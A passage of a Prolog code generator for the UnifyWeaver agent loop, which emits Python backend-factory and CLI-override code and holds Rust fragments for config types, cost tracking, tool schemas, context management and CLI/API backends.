    format(S, '\'~w\'', [Last]).
format_choices_list(S, [H|T]) :-
    format(S, '\'~w\', ', [H]),
    format_choices_list(S, T).

%% =============================================================================
%% Generator helpers: CLI fallbacks dict
%% =============================================================================

%% generate_cli_fallbacks_dict(S) - emit the _CLI_FALLBACKS dict
generate_cli_fallbacks_dict(S) :-
    write(S, '# Fallback chains: primary command → alternatives\n'),
    write(S, '# Note: coro has no fallback — claude-code uses different CLI args\n'),
    write(S, '# (coro uses positional prompt, claude-code uses -p flag).\n'),
    write(S, '# Use -b claude-code explicitly if coro is not installed.\n'),
    write(S, '_CLI_FALLBACKS = {\n'),
    findall(BT, cli_fallbacks(BT, _), BTs),
    generate_fallback_entries(S, BTs),
    write(S, '}\n').

generate_fallback_entries(_, []) :- !.
generate_fallback_entries(S, [BT|Rest]) :-
    cli_fallbacks(BT, Fallbacks),
    %% Generate comment for empty lists
    (Fallbacks == [] ->
        format(S, '    \'~w\': [],', [BT]),
        %% Add inline comment
        fallback_comment(BT, Comment),
        format(S, '~w~n', [Comment])
    ;
        format(S, '    \'~w\': ~w,~n', [BT, Fallbacks])
    ),
    generate_fallback_entries(S, Rest).

%% generate_audit_levels_dict(S) - emit audit_levels dict from audit_profile_level/2 facts
%% Uses binding_dict_name/3 to derive the Python variable name from binding metadata.
generate_audit_levels_dict(S) :-
    agent_loop_bindings:init_agent_loop_bindings,
    agent_loop_bindings:binding_dict_name(python, audit_profile_level/2, DictName),
    write(S, '\n    # Create audit logger based on security profile\n'),
    format(S, '    ~w = {~n', [DictName]),
    agent_loop_components:emit_audit_levels(S, [target(python)]),
    write(S, '    }\n').

%% generate_cli_overrides(S) - emit CLI argument overrides from cli_override/3 facts
generate_cli_overrides(S) :-
    write(S, '    # Override with command line args\n'),
    agent_loop_components:emit_cli_overrides(S, [target(python)]).

emit_single_override(S, backend, _, backend_special) :- !,
    write(S, '    if args.backend:\n'),
    write(S, '        agent_config.backend = args.backend\n'),
    write(S, '        # Clear command so backend uses its own default\n'),
    write(S, '        if not args.command:\n'),
    write(S, '            agent_config.command = None\n').
emit_single_override(S, Arg, _, set_true) :- !,
    format(S, '    if args.~w:~n', [Arg]),
    format(S, '        agent_config.~w = True~n', [Arg]).
emit_single_override(S, Arg, Field, clear_list) :- !,
    format(S, '    if args.~w:~n', [Arg]),
    format(S, '        agent_config.~w = []~n', [Field]).
emit_single_override(S, Arg, Field, not_none_check) :- !,
    format(S, '    if args.~w is not None:~n', [Arg]),
    format(S, '        agent_config.~w = args.~w~n', [Field, Arg]).
emit_single_override(S, Arg, Field, simple) :-
    format(S, '    if args.~w:~n', [Arg]),
    format(S, '        agent_config.~w = args.~w~n', [Field, Arg]).

%% Comments for each fallback entry
fallback_comment(coro, '               # no fallback (different CLI interface)') :- !.
fallback_comment('claude-code', '        # no fallback') :- !.
fallback_comment(gemini, '             # no fallback') :- !.
fallback_comment('ollama-cli', '         # no fallback') :- !.
fallback_comment(_, '').

%% =============================================================================
%% Generator helpers: Backend factory function
%% =============================================================================

%% generate_backend_factory_fn(S) - emit the create_backend_from_config function
generate_backend_factory_fn(S) :-
    agent_loop_components:register_agent_loop_components,
    %% Function signature
    write(S, 'def create_backend_from_config(agent_config: AgentConfig, config_dir: str = "",\n'),
    write(S, '                               sandbox: bool = False, approval_mode: str = "yolo",\n'),
    write(S, '                               allowed_tools: list[str] | None = None,\n'),
    write(S, '                               no_fallback: bool = False) -> AgentBackend:\n'),
    write(S, '    """Create a backend from an AgentConfig."""\n'),
    write(S, '    backend_type = agent_config.backend\n'),
    write(S, '\n'),
    write(S, '    # Build system prompt with skills/agent.md\n'),
    write(S, '    system_prompt = build_system_prompt(agent_config, config_dir)\n'),
    %% Generate if/elif chain from backend_factory/2 facts
    backend_factory_order(Order),
    generate_factory_chain(S, Order, first),
    %% else clause
    write(S, '\n'),
    write(S, '    else:\n'),
    write(S, '        raise ValueError(f"Unknown backend type: {backend_type}")\n').

%% generate_factory_chain(S, Backends, FirstFlag)
generate_factory_chain(_, [], _) :- !.
generate_factory_chain(S, [BT|Rest], FirstFlag) :-
    component(agent_backends, BT, backend, Props),
    generate_factory_branch(S, BT, Props, FirstFlag),
    generate_factory_chain(S, Rest, not_first).

%% generate_factory_branch(S, BackendType, Props, FirstFlag)
generate_factory_branch(S, BT, Props, FirstFlag) :-
    member(resolve_type(RT), Props),
    member(class_name(ClassName), Props),
    member(constructor_args(Args), Props),
    %% Blank line + if/elif
    nl(S),
    (FirstFlag == first ->
        format(S, '    if backend_type == \'~w\':~n', [BT])
    ;
        format(S, '    elif backend_type == \'~w\':~n', [BT])
    ),
    %% Import statement (if needed)
    (member(import_from(Mod), Props) ->
        format(S, '        from ~w import ~w~n', [Mod, ClassName])
    ; true),
    %% Extra openrouter import
    (RT == openrouter ->
        write(S, '        from backends.openrouter_api import DEFAULT_TOOL_SCHEMAS\n')
    ; true),
    %% Resolution logic based on resolve_type
    generate_resolve_logic(S, BT, RT, Props),
    %% Constructor call
    format(S, '        return ~w(~n', [ClassName]),
    generate_constructor_args(S, Args, Props),
    write(S, '        )\n').

%% generate_resolve_logic(S, BackendType, ResolveType, Props)
%% cli: resolve command
generate_resolve_logic(S, BT, cli, Props) :-
    (member(default_command(DefCmd), Props) -> true ; DefCmd = BT),
    format(S, '        cmd = _resolve_command(\'~w\', agent_config.command, \'~w\',~n', [BT, DefCmd]),
    format(S, '                               _CLI_FALLBACKS[\'~w\'], no_fallback)~n', [BT]).
%% api: resolve key
generate_resolve_logic(S, BT, api, _) :-
    format(S, '        api_key = resolve_api_key(\'~w\', agent_config.api_key, no_fallback)~n', [BT]).
%% api_local: no auth needed
generate_resolve_logic(_, _, api_local, _) :- !.
%% openrouter: special cascade
generate_resolve_logic(S, _, openrouter, _) :-
    write(S, '        # Resolve API key and config through unified cascade\n'),
    write(S, '        api_key = resolve_api_key(\'openrouter\', agent_config.api_key, no_fallback)\n'),
    write(S, '        cascade = read_config_cascade(no_fallback)\n'),
    write(S, '        # Use tool schemas if tools are configured\n'),
    write(S, '        tool_schemas = DEFAULT_TOOL_SCHEMAS if agent_config.tools else None\n').

%% generate_constructor_args(S, ArgSpecs, Props) - emit kwarg lines
generate_constructor_args(_, [], _) :- !.
generate_constructor_args(S, [Arg], Props) :- !,
    %% Last arg: no trailing comma
    generate_single_arg(S, Arg, Props, last).
generate_constructor_args(S, [Arg|Rest], Props) :-
    generate_single_arg(S, Arg, Props, not_last),
    generate_constructor_args(S, Rest, Props).

%% generate_single_arg(S, ArgSpec, Props, LastFlag)
%% arg(kwname, varname) — simple keyword=variable
generate_single_arg(S, arg(KW, Var), _, LastFlag) :-
    (LastFlag == last ->
        format(S, '            ~w=~w~n', [KW, Var])
    ;
        format(S, '            ~w=~w,~n', [KW, Var])
    ).
%% arg_expr(kwname, Expr) — keyword=expression (verbatim)
generate_single_arg(S, arg_expr(KW, Expr), _, LastFlag) :-
    (LastFlag == last ->
        format(S, '            ~w=~w~n', [KW, Expr])
    ;
        format(S, '            ~w=~w,~n', [KW, Expr])
    ).
%% arg_model — model=agent_config.model or 'default'
generate_single_arg(S, arg_model, Props, LastFlag) :-
    (member(default_model(DefModel), Props) ->
        (LastFlag == last ->
            format(S, '            model=agent_config.model or \'~w\'~n', [DefModel])
        ;
            format(S, '            model=agent_config.model or \'~w\',~n', [DefModel])
        )
    ;
        %% No default model — just use agent_config.model
        (LastFlag == last ->
            write(S, '            model=agent_config.model\n')
        ;
            write(S, '            model=agent_config.model,\n')
        )
    ).
%% arg_trailing(kwname, varname) — with trailing comma (openrouter style)
generate_single_arg(S, arg_trailing(KW, Var), _, _) :-
    format(S, '            ~w=~w,~n', [KW, Var]).

%% =============================================================================
%% Generator: agent_loop.py (hybrid — fragments + generated sections)
%% =============================================================================

%% generate_agent_loop_main - assemble agent_loop.py from 7 fragments + 5 generated sections
generate_agent_loop_main :-
    output_path(python, 'agent_loop.py', Path),
    open(Path, write, S),
    %% 1. Imports (lines 1-30)
    write_py(S, agent_loop_imports),
    %% Binding dispatch documentation
    nl(S),
    agent_loop_bindings:emit_binding_dispatch_comment(S, []),
    nl(S),
    %% 2. Class definition + __init__ + _get_input (lines 32-121)
    write_py(S, agent_loop_class_init),
    %% Blank line separator (line 121)
    nl(S),
    %% 3. _handle_command method: preamble + generated dispatch + return False
    %% Lines 122-136: method header + alias resolution + slash stripping
    write(S, '    def _handle_command(self, user_input: str) -> bool:\n'),
    write(S, '        """Handle special commands. Returns True if command was handled."""\n'),
    write(S, '        # Apply alias resolution first\n'),
    write(S, '        resolved = self.alias_manager.resolve(user_input)\n'),
    write(S, '        if resolved != user_input:\n'),
    write(S, '            user_input = resolved\n'),
    write(S, '\n'),
    write(S, '        text = user_input.strip()\n'),
    write(S, '        cmd = text.lower()\n'),
    write(S, '\n'),
    write(S, '        # Handle both with and without slash prefix\n'),
    write(S, '        if cmd.startswith(\'/\'):\n'),
    write(S, '            cmd = cmd[1:]\n'),
    write(S, '            text = text[1:]\n'),
    write(S, '\n'),
    %% Lines 137-220: generated dispatch chain
    generate_command_dispatch(S),
    %% Line 221: return False
    write(S, '        return False\n'),
    %% Blank line separator (line 222)
    nl(S),
    %% 4. Command handler methods (lines 223-549)
    emit_handler_fragments(S),
    %% Blank line separators (lines 549-550)
    nl(S), nl(S),
    %% 5. Generated help text method (lines 551-595)
    generate_help_text(S),
    %% Blank line separator (line 596)
    nl(S),
    %% 6a. _print_status (lines 597-615)
    write_py(S, agent_loop_status_method),
    nl(S),
    %% 6b. _process_message (lines 617-779)
    write_py(S, agent_loop_process_message),
    %% Two blank line separators (lines 779-780)
    nl(S), nl(S),
    %% 7. build_system_prompt + _resolve_command (lines 781-835)
    write_py(S, agent_loop_helpers),
    %% Two blank line separators (lines 835-836)
    nl(S), nl(S),
    %% 8. Generated CLI fallbacks dict (lines 837-846)
    generate_cli_fallbacks_dict(S),
    %% Two blank line separators (lines 847-848)
    write(S, '\n\n'),
    %% 9. Generated backend factory function (lines 849-947)
    generate_backend_factory_fn(S),
    %% Two blank line separators (lines 947-948)
    nl(S), nl(S),
    %% 10. def main() + parser creation (lines 949-954)
    write(S, 'def main():\n'),
    write(S, '    """Entry point."""\n'),
    write(S, '    parser = argparse.ArgumentParser(\n'),
    write(S, '        description="UnifyWeaver Agent Loop - Terminal-friendly AI assistant"\n'),
    write(S, '    )\n'),
    write(S, '\n'),
    %% 11. Generated argparse block (lines 955-1180)
    generate_argparse_block(S),
    %% Blank line separator (line 1181)
    nl(S),
    %% 12. Main body: args parsing, CLI overrides, audit, run logic
    write_py(S, agent_loop_main_body_pre_overrides),
    nl(S),
    generate_cli_overrides(S),
    write_py(S, agent_loop_main_body_post_overrides),
    generate_audit_levels_dict(S),
    write_py(S, agent_loop_main_body_post_audit),
    close(S),
    format('  Generated agent_loop.py~n', []).

%% =============================================================================
%% Generator: README.md
%% =============================================================================

generate_readme :-
    output_path(python, 'README.md', ReadmePath),
    open(ReadmePath, write, S),
    write(S, '# UnifyWeaver Agent Loop - Generated Code\n\n'),
    write(S, 'This code was generated by `agent_loop_module.pl` using a hybrid approach:\n'),
    write(S, 'Prolog facts for tabular data (CLI arguments, slash commands, aliases, fallbacks)\n'),
    write(S, 'and `py_fragment` atoms for imperative logic.\n\n'),
    write(S, 'Regenerate with: `swipl -g "generate_all, halt" ../agent_loop_module.pl`\n\n'),
    agent_loop_components:emit_readme_sections(S, [target(python)]),
    write(S, '\n'),
    agent_loop_components:emit_dependency_diagram(S, []),
    write(S, '## Usage\n\n'),
    write(S, '```bash\n'),
    write(S, 'python3 agent_loop.py              # interactive\n'),
    write(S, 'python3 agent_loop.py "prompt"     # single prompt\n'),
    write(S, 'python3 agent_loop.py -b claude    # use Claude API\n'),
    write(S, '```\n'),
    close(S),
    format('  Generated README.md~n', []).

%% =============================================================================
%% Python Code Fragment System
%% =============================================================================
%%
%% py_fragment(Name, Code) — named Python code fragments that can be composed.
%% Fragments are multiline strings written verbatim to output streams.
%%
%% write_py(S, Name) — write a named fragment to stream S.
%% write_py(S, Name, Subs) — write fragment with {{Key}} substitutions.
%%
%% This decomposes the 2000+ lines of verbatim Python in backend generators
%% into ~30 reusable, composable units.

:- discontiguous py_fragment/2.

%% Write a fragment to a stream
write_py(S, Name) :-
    (py_fragment(Name, Code) ->
        write(S, Code)
    ;
        format(atom(Msg), 'Unknown py_fragment: ~w', [Name]),
        throw(error(existence_error(py_fragment, Name), context(write_py/2, Msg)))
    ).

%% Write a fragment with {{Key}} -> Value substitutions
write_py(S, Name, Subs) :-
    py_fragment(Name, Code),
    apply_subs(Code, Subs, Result),
    write(S, Result).

%% Apply substitutions: list of Key=Value pairs
apply_subs(Code, [], Code).
apply_subs(Code, [Key=Value|Rest], Result) :-
    format(atom(Placeholder), '{{~w}}', [Key]),
    atom_string(Code, CodeStr),
    atom_string(Placeholder, PlaceholderStr),
    (atom(Value) -> atom_string(Value, ValueStr) ; term_string(Value, ValueStr)),
    replace_all_sub(CodeStr, PlaceholderStr, ValueStr, Mid),
    atom_string(MidAtom, Mid),
    apply_subs(MidAtom, Rest, Result).

%% Replace all occurrences of Sub in String with Rep
replace_all_sub(String, Sub, Rep, Result) :-
    string_length(Sub, SubLen),
    (sub_string(String, Before, SubLen, _, Sub) ->
        sub_string(String, 0, Before, _, Prefix),
        Start is Before + SubLen,
        sub_string(String, Start, _, 0, Suffix),
        replace_all_sub(Suffix, Sub, Rep, RestResult),
        string_concat(Prefix, Rep, Part1),
        string_concat(Part1, RestResult, Result)
    ;
        Result = String
    ).

%% --- Prolog fragments: named Prolog code blocks ---
%% Parallel to py_fragment/2 — stores Prolog code for write_prolog/2.
%% Extracts verbatim Prolog into composable, testable units.

:- discontiguous prolog_fragment/2.

%% Write a named Prolog fragment to stream
write_prolog(S, Name) :-
    (prolog_fragment(Name, Code) ->
        write(S, Code)
    ;
        format(atom(Msg), 'Unknown prolog_fragment: ~w', [Name]),
        throw(error(existence_error(prolog_fragment, Name), context(write_prolog/2, Msg)))
    ).

%% Write a Prolog fragment with {{Key}} -> Value substitutions
write_prolog(S, Name, Subs) :-
    prolog_fragment(Name, Code),
    apply_subs(Code, Subs, Result),
    write(S, Result).

%% --- Rust fragments: named Rust code blocks ---
%% Parallel to py_fragment/2 and prolog_fragment/2.

:- discontiguous rust_fragment/2.

%% Write a named Rust fragment to stream
write_rust(S, Name) :-
    (rust_fragment(Name, Code) ->
        write(S, Code)
    ;
        format(atom(Msg), 'Unknown rust_fragment: ~w', [Name]),
        throw(error(existence_error(rust_fragment, Name), context(write_rust/2, Msg)))
    ).

%% Write a Rust fragment with {{Key}} -> Value substitutions
write_rust(S, Name, Subs) :-
    rust_fragment(Name, Code),
    apply_subs(Code, Subs, Result),
    write(S, Result).

%% =============================================================================
%% Unified Fragment System — target_fragment/3 + write_fragment/3
%% =============================================================================
%% Provides target-polymorphic access to all fragment types.
%% Existing write_py/2, write_prolog/2, write_rust/2 remain as shortcuts.

target_fragment(python, Name, Code) :- py_fragment(Name, Code).
target_fragment(prolog, Name, Code) :- prolog_fragment(Name, Code).
target_fragment(rust, Name, Code)   :- rust_fragment(Name, Code).

%% Write a named fragment for a specific target
write_fragment(S, Target, Name) :-
    (target_fragment(Target, Name, Code) ->
        write(S, Code)
    ;
        format(atom(Msg), 'Unknown ~w fragment: ~w', [Target, Name]),
        throw(error(existence_error(fragment, Target-Name), context(write_fragment/3, Msg)))
    ).

%% Write a fragment with {{Key}} -> Value substitutions
write_fragment(S, Target, Name, Subs) :-
    target_fragment(Target, Name, Code),
    apply_subs(Code, Subs, Result),
    write(S, Result).

%% =============================================================================
%% Rust Fragments — config.rs types
%% =============================================================================

rust_fragment(config_types, '
/// CLI argument specification
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CliArgument {
    pub name: &''static str,
    pub long_flag: &''static str,
    pub short_flag: &''static str,
    pub default_value: &''static str,
    pub help: &''static str,
}

/// Agent configuration field specification
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfigField {
    pub name: &''static str,
    pub type_annotation: &''static str,
    pub default_value: &''static str,
    pub comment: &''static str,
}

/// API key environment variable mapping
#[derive(Debug, Clone)]
pub struct ApiKeyMapping {
    pub backend: &''static str,
    pub env_var: &''static str,
}

/// API key file path mapping
#[derive(Debug, Clone)]
pub struct ApiKeyFilePath {
    pub backend: &''static str,
    pub file_path: &''static str,
}

/// Configuration search path
#[derive(Debug, Clone)]
pub struct ConfigSearchPath {
    pub path: &''static str,
    pub priority: &''static str,
}

/// Default agent preset
#[derive(Debug, Clone)]
pub struct DefaultPreset {
    pub name: &''static str,
    pub backend: &''static str,
    pub overrides: &''static str,
}

/// Audit profile level mapping
#[derive(Debug, Clone)]
pub struct AuditLevel {
    pub profile: &''static str,
    pub level: &''static str,
}

').

%% =============================================================================
%% Rust Fragments — costs.rs types + tracker
%% =============================================================================

rust_fragment(costs_types, '
/// Model pricing information (per million tokens)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Pricing {
    pub input: f64,
    pub output: f64,
}

/// Token usage record
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UsageRecord {
    pub model: String,
    pub input_tokens: u64,
    pub output_tokens: u64,
    pub input_cost: f64,
    pub output_cost: f64,
    pub total_cost: f64,
}

').

rust_fragment(costs_tracker, '
/// Cost tracker for aggregating token usage across requests
#[derive(Debug, Default)]
pub struct CostTracker {
    pub total_input_tokens: u64,
    pub total_output_tokens: u64,
    pub records: Vec<UsageRecord>,
}

impl CostTracker {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn record_usage(&mut self, model: &str, input_tokens: u64, output_tokens: u64) {
        let (input_cost, output_cost) = PRICING.iter()
            .find(|(m, _)| *m == model)
            .map(|(_, p)| (
                input_tokens as f64 * p.input / 1_000_000.0,
                output_tokens as f64 * p.output / 1_000_000.0,
            ))
            .unwrap_or((0.0, 0.0));

        self.total_input_tokens += input_tokens;
        self.total_output_tokens += output_tokens;
        self.records.push(UsageRecord {
            model: model.to_string(),
            input_tokens,
            output_tokens,
            input_cost,
            output_cost,
            total_cost: input_cost + output_cost,
        });
    }

    pub fn total_cost(&self) -> f64 {
        self.records.iter().map(|r| r.total_cost).sum()
    }

    pub fn format_summary(&self) -> String {
        format!(
            "Tokens: {} in / {} out | Cost: ${:.4}",
            self.total_input_tokens,
            self.total_output_tokens,
            self.total_cost()
        )
    }
}

').

%% =============================================================================
%% Rust Fragments — tools.rs types
%% =============================================================================

rust_fragment(tools_types, '
/// Tool parameter specification
#[derive(Debug, Clone)]
pub struct ToolParam {
    pub name: &''static str,
    pub param_type: &''static str,
    pub required: bool,
    pub description: &''static str,
}

/// Tool specification with parameter schemas
#[derive(Debug, Clone)]
pub struct ToolSpec {
    pub name: &''static str,
    pub description: &''static str,
    pub parameters: &''static [ToolParam],
}

/// Generate JSON tool schemas for API requests (OpenAI/Anthropic format).
pub fn tool_schemas_json() -> Vec<serde_json::Value> {
    TOOL_SPECS.iter().map(|spec| {
        let mut properties = serde_json::Map::new();
        let mut required = Vec::new();
        for p in spec.parameters {
            properties.insert(p.name.to_string(), serde_json::json!({
                "type": p.param_type,
                "description": p.description,
            }));
            if p.required {
                required.push(serde_json::Value::String(p.name.to_string()));
            }
        }
        serde_json::json!({
            "type": "function",
            "function": {
                "name": spec.name,
                "description": spec.description,
                "parameters": {
                    "type": "object",
                    "properties": properties,
                    "required": required,
                }
            }
        })
    }).collect()
}

').

%% =============================================================================
%% Rust Fragments — commands.rs types
%% =============================================================================

rust_fragment(commands_types, '
/// Slash command specification
#[derive(Debug, Clone)]
pub struct CommandSpec {
    pub match_type: &''static str,
    pub help: &''static str,
}

').

%% =============================================================================
%% Rust Fragments — security.rs types
%% =============================================================================

rust_fragment(security_types, '
/// Security profile specification
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityProfileSpec {
    pub path_validation: bool,
    pub command_validation: bool,
}

').

%% --- Rust Phase 2: Imperative layer fragments ---

rust_fragment(types_core, '
use std::collections::HashMap;

/// Represents a tool call from the agent.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolCall {
    pub name: String,
    pub arguments: HashMap<String, serde_json::Value>,
    pub id: String,
}

/// Response from an agent backend.
#[derive(Debug, Clone)]
pub struct AgentResponse {
    pub content: String,
    pub tool_calls: Vec<ToolCall>,
    pub input_tokens: u64,
    pub output_tokens: u64,
    pub model: String,
}

impl Default for AgentResponse {
    fn default() -> Self {
        Self {
            content: String::new(),
            tool_calls: Vec::new(),
            input_tokens: 0,
            output_tokens: 0,
            model: String::new(),
        }
    }
}

/// Result of executing a tool.
#[derive(Debug, Clone)]
pub struct ToolResult {
    pub success: bool,
    pub output: String,
    pub tool_name: String,
}

/// A message in the conversation context.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Message {
    pub role: String,
    pub content: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_calls: Option<Vec<ToolCall>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_call_id: Option<String>,
}

').

rust_fragment(context_manager, '

/// Manages conversation history with context modes and multi-limit trimming.
#[derive(Debug)]
pub struct ContextManager {
    pub messages: Vec<Message>,
    pub max_messages: usize,
    pub max_context_tokens: i64,
    pub max_chars: i64,
    pub max_words: i64,
    pub context_mode: String,
}

impl Default for ContextManager {
    fn default() -> Self {
        Self {
            messages: Vec::new(),
            max_messages: 50,
            max_context_tokens: 100000,
            max_chars: 0,
            max_words: 0,
            context_mode: "continue".to_string(),
        }
    }
}

impl ContextManager {
    pub fn new(max_messages: usize, max_context_tokens: i64, max_chars: i64, max_words: i64, context_mode: &str) -> Self {
        Self {
            messages: Vec::new(),
            max_messages,
            max_context_tokens,
            max_chars,
            max_words,
            context_mode: context_mode.to_string(),
        }
    }

    pub fn add_message(&mut self, role: &str, content: &str) {
        // Fresh mode: clear before each user message
        if self.context_mode == "fresh" && role == "user" {
            self.messages.clear();
        }
        self.messages.push(Message {
            role: role.to_string(),
            content: content.to_string(),
            tool_calls: None,
            tool_call_id: None,
        });
        self.trim_if_needed();
    }

    pub fn add_tool_call_message(&mut self, content: &str, tool_calls: Vec<ToolCall>) {
        self.messages.push(Message {
            role: "assistant".to_string(),
            content: content.to_string(),
            tool_calls: Some(tool_calls),
            tool_call_id: None,
        });
        self.trim_if_needed();
    }

    pub fn add_tool_result(&mut self, tool_call_id: &str, output: &str) {
        self.messages.push(Message {
            role: "tool".to_string(),
            content: output.to_string(),
            tool_calls: None,
            tool_call_id: Some(tool_call_id.to_string()),
        });
        self.trim_if_needed();
    }

    pub fn get_context(&self) -> &[Message] {
        &self.messages
    }

    pub fn get_messages(&self) -> &[Message] {
        &self.messages
    }

    pub fn clear(&mut self) {
        self.messages.clear();
    }

    pub fn len(&self) -> usize {
        self.messages.len()
    }

    pub fn is_empty(&self) -> bool {
        self.messages.is_empty()
    }

    /// Total character count across all messages.
    pub fn char_count(&self) -> usize {
        self.messages.iter().map(|m| m.content.len()).sum()
    }

    /// Total word count across all messages.
    pub fn word_count(&self) -> usize {
        self.messages.iter()
            .map(|m| m.content.split_whitespace().count())
            .sum()
    }

    /// Estimated token count (chars / 4 heuristic).
    pub fn estimate_tokens(&self) -> usize {
        self.char_count() / 4
    }

    /// Trim messages to stay within all configured limits.
    pub fn trim_if_needed(&mut self) {
        // Message count limit (sliding window)
        if self.max_messages > 0 && self.messages.len() > self.max_messages {
            let excess = self.messages.len() - self.max_messages;
            self.messages.drain(..excess);
        }
        // Token limit
        if self.max_context_tokens > 0 {
            while self.messages.len() > 1 && self.estimate_tokens() > self.max_context_tokens as usize {
                self.messages.remove(0);
            }
        }
        // Character limit
        if self.max_chars > 0 {
            while self.messages.len() > 1 && self.char_count() > self.max_chars as usize {
                self.messages.remove(0);
            }
        }
        // Word limit
        if self.max_words > 0 {
            while self.messages.len() > 1 && self.word_count() > self.max_words as usize {
                self.messages.remove(0);
            }
        }
    }
}

').

rust_fragment(backend_trait, '

/// Abstract interface for agent backends.
pub trait AgentBackend {
    /// Send a message with context and return the response.
    fn send_message(&self, message: &str, context: &[Message]) -> AgentResponse;

    /// Return the backend name.
    fn name(&self) -> &str;

    /// Whether this backend supports streaming output.
    fn supports_streaming(&self) -> bool { false }
}

').

rust_fragment(backend_cli_impl, '

/// CLI-based backend that shells out to a command.
pub struct CliBackend {
    pub backend_name: String,
    pub command: String,
    pub args: Vec<String>,
    pub model: Option<String>,
}

impl CliBackend {
    pub fn new(name: &str, command: &str, args: &[&str], model: Option<String>) -> Self {
        Self {
            backend_name: name.to_string(),
            command: command.to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            model,
        }
    }
}

impl AgentBackend for CliBackend {
    fn send_message(&self, message: &str, _context: &[Message]) -> AgentResponse {
        let mut cmd = Command::new(&self.command);
        for arg in &self.args {
            cmd.arg(arg);
        }
        if let Some(ref model) = self.model {
            cmd.arg(model);
        }
        cmd.arg(message);
        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

        match cmd.output() {
            Ok(output) => {
                let content = String::from_utf8_lossy(&output.stdout).to_string();
                AgentResponse {
                    content,
                    model: self.backend_name.clone(),
                    ..Default::default()
                }
            }
            Err(e) => AgentResponse {
                content: format!("Error running {}: {}", self.command, e),
                model: self.backend_name.clone(),
                ..Default::default()
            },
        }
    }

    fn name(&self) -> &str { &self.backend_name }
}

').

rust_fragment(backend_api_impl, '

/// API-based backend that sends HTTP requests.
/// Supports OpenAI and Anthropic message formats via api_format field.
pub struct ApiBackend {
    pub backend_name: String,
    pub endpoint: String,
    pub api_key: Option<String>,
    pub model: String,
    pub stream: bool,
    pub api_format: String,
}

impl ApiBackend {
    pub fn new(name: &str, endpoint: &str, api_key: Option<String>, model: &str, stream: bool, api_format: &str) -> Self {
        Self {
            backend_name: name.to_string(),
            endpoint: endpoint.to_string(),
            api_key,
            model: model.to_string(),
            stream,
            api_format: api_format.to_string(),
        }
    }

    fn build_messages(&self, message: &str, context: &[Message]) -> Vec<serde_json::Value> {
        let mut messages: Vec<serde_json::Value> = context.iter().map(|m| {
            serde_json::json!({
                "role": m.role,
                "content": m.content,
            })
        }).collect();
        messages.push(serde_json::json!({
            "role": "user",
            "content": message,
        }));
        messages
    }

    fn build_request_body(&self, message: &str, context: &[Message]) -> serde_json::Value {
        use crate::tools::tool_schemas_json;
        let messages = self.build_messages(message, context);
        let tools = tool_schemas_json();

        if self.api_format == "anthropic" {
            // Anthropic: system is top-level, tools use input_schema
            let anthropic_tools: Vec<serde_json::Value> = tools.iter().map(|t| {
                let func = &t["function"];
                serde_json::json!({
                    "name": func["name"],
                    "description": func["description"],
                    "input_schema": func["parameters"],
                })
            }).collect();
            let mut body = serde_json::json!({
                "model": self.model,
                "messages": messages,
                "max_tokens": 4096,
            });
            if !anthropic_tools.is_empty() {
                body["tools"] = serde_json::json!(anthropic_tools);
            }
            body
        } else {
            // OpenAI / OpenRouter / Ollama format
            let mut body = serde_json::json!({
                "model": self.model,
                "messages": messages,
            });
            if !tools.is_empty() {
                body["tools"] = serde_json::json!(tools);
            }
            body
        }
    }

    fn add_auth_header(&self, req: reqwest::blocking::RequestBuilder) -> reqwest::blocking::RequestBuilder {
        if let Some(ref key) = self.api_key {
            if self.api_format == "anthropic" {
                req.header("x-api-key", key)
                   .header("anthropic-version", "2023-06-01")
            } else {
                req.header("Authorization", format!("Bearer {}", key))
            }
        } else {
            req
        }
    }

    /// Extract tool calls from an OpenAI-format response.
    fn extract_tool_calls_openai(json: &serde_json::Value) -> Vec<ToolCall> {
        let mut calls = Vec::new();
        if let Some(tool_calls) = json["choices"][0]["message"]["tool_calls"].as_array() {
            for tc in tool_calls {
                let name = tc["function"]["name"].as_str().unwrap_or("").to_string();
                let id = tc["id"].as_str().unwrap_or("").to_string();
                let args_str = tc["function"]["arguments"].as_str().unwrap_or("{}");
                let arguments: std::collections::HashMap<String, serde_json::Value> =
                    serde_json::from_str(args_str).unwrap_or_default();
                calls.push(ToolCall { name, arguments, id });
            }
        }
        calls
    }

    /// Extract tool calls from an Anthropic-format response.
    fn extract_tool_calls_anthropic(json: &serde_json::Value) -> Vec<ToolCall> {
        let mut calls = Vec::new();
        if let Some(content) = json["content"].as_array() {
            for block in content {
                if block["type"].as_str() == Some("tool_use") {
                    let name = block["name"].as_str().unwrap_or("").to_string();
                    let id = block["id"].as_str().unwrap_or("").to_string();
                    let arguments: std::collections::HashMap<String, serde_json::Value> =
                        if let Some(input) = block["input"].as_object() {
                            input.iter().map(|(k, v)| (k.clone(), v.clone())).collect()
                        } else {
                            std::collections::HashMap::new()
                        };
                    calls.push(ToolCall { name, arguments, id });
                }
            }
        }
        calls
    }

    /// Parse response JSON into AgentResponse (format-aware).
    fn parse_response(&self, json: serde_json::Value) -> AgentResponse {
        if self.api_format == "anthropic" {
            let content = json["content"].as_array()
                .and_then(|arr| arr.iter()
                    .find(|b| b["type"].as_str() == Some("text"))
                    .and_then(|b| b["text"].as_str()))
                .unwrap_or("")
                .to_string();
            let input_tokens = json["usage"]["input_tokens"].as_u64().unwrap_or(0);
            let output_tokens = json["usage"]["output_tokens"].as_u64().unwrap_or(0);
            let tool_calls = Self::extract_tool_calls_anthropic(&json);
            AgentResponse {
                content, input_tokens, output_tokens,
                model: self.model.clone(),
                tool_calls,
            }
        } else {
            let content = json["choices"][0]["message"]["content"]
                .as_str().unwrap_or("").to_string();
            let input_tokens = json["usage"]["prompt_tokens"].as_u64().unwrap_or(0);
            let output_tokens = json["usage"]["completion_tokens"].as_u64().unwrap_or(0);
            let tool_calls = Self::extract_tool_calls_openai(&json);
            AgentResponse {
                content, input_tokens, output_tokens,
                model: self.model.clone(),
                tool_calls,
            }
        }
    }
}

